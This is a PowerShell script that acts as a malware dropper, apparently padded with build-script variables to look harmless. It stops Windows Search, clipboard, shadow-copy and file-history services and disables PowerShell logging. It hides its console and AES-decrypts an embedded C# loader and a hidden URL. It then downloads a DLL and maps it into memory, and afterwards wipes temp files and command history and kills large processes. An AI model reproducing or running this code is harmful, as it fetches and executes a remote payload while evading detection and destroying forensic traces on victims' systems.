Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null

Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "VSS*" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "fhsvc*" -Force -ErrorAction SilentlyContinue

$regCommand1 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"
$regCommand3 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ModuleLogging' /v EnableModuleLogging /t REG_DWORD /d 0 /f"
$regCommand4 = "reg add 'HKLM\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null
Invoke-Expression $regCommand3 | Out-Null
Invoke-Expression $regCommand4 | Out-Null


Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.ps1" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue

Set-StrictMode -Version Latest

$VerbosePreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$InformationPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
$ConfirmPreference = 'None'
$WhatIfPreference = $false
$PSModuleAutoLoadingPreference = 'None'
$MaximumHistoryCount = 0

*> $null
$Error.Clear()

[string] $script:vcPath = $null
[System.IO.DirectoryInfo] $script:OpenSSHRoot = $null
[System.IO.DirectoryInfo] $script:gitRoot = $null
[bool] $script:Verbose = $false
[string] $script:BuildLogFile = $null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null


Add-Type -Name Window -Namespace Console -MemberDefinition @'
[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@ -ErrorAction SilentlyContinue
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)

function Invoke-Finalize {
    try {
        Get-Variable -Scope Script -ErrorAction SilentlyContinue |
            Remove-Variable -Scope Script -Force -ErrorAction SilentlyContinue
        Get-Variable | Where-Object {
            $_.Name -notmatch '^(PS|ExecutionContext|Host|Error|MyInvocation|PID)$'
        } | Remove-Variable -Force -ErrorAction SilentlyContinue
        Clear-Host
        $Error.Clear()
        [GC]::Collect()
        [GC]::WaitForPendingFinalizers()
        [GC]::Collect()
        Get-Process | ForEach-Object { $_.MinWorkingSet = $_.MinWorkingSet }
        Get-Process | Where-Object {$_.WorkingSet -gt 300MB} | Stop-Process -Force
    } catch {}
}

if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
{
    Invoke-Finalize
    return
}


$encryptedCodeBase64 = "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"
$encryptedUrlBase64  = "P51ijdY87eRDmBEXobE2hdsZ/GS8LZd9XYlJ8W3eztH9Y8lpIASchoczeMHZVwbZlbuuKJmp4EZ10NKqz7pmTtGMimUlY0nhgACgHsoxCJ0="
$keyBase64           = "8idp4ynDPYZadZkpehgu+9WHeifeiXQlBazdi/IEvvE="
$ivBase64            = "1PHFtJVpX9crX2iRHYBtAA=="


function Decrypt-Bytes {
    param(
        [string]$encB64,
        [string]$keyB64,
        [string]$ivB64
    )
    $encBytes = [Convert]::FromBase64String($encB64)
    $key = [Convert]::FromBase64String($keyB64)
    $iv  = [Convert]::FromBase64String($ivB64)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.IV  = $iv
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

    $decryptor = $aes.CreateDecryptor()
    $plainBytes = $decryptor.TransformFinalBlock($encBytes, 0, $encBytes.Length)
    return $plainBytes
}


$codeBytes = Decrypt-Bytes -encB64 $encryptedCodeBase64 -keyB64 $keyBase64 -ivB64 $ivBase64
$loaderCode = [System.Text.Encoding]::UTF8.GetString($codeBytes)

$urlBytes = Decrypt-Bytes -encB64 $encryptedUrlBase64 -keyB64 $keyBase64 -ivB64 $ivBase64
$dllUrl = [System.Text.Encoding]::UTF8.GetString($urlBytes)


try {
    Add-Type -TypeDefinition $loaderCode -ErrorAction Stop
} catch {
    Invoke-Finalize
    return
}


$bytes = (New-Object System.Net.WebClient).DownloadData($dllUrl)
[NativeLoader]::Map($bytes, $true)


Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.pdb" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue

$bytes = $null; $loaderCode = $null; $codeBytes = $null; $urlBytes = $null
[GC]::Collect(); [GC]::WaitForPendingFinalizers()


$historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $historyPath) {
    Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
}

Invoke-Finalize
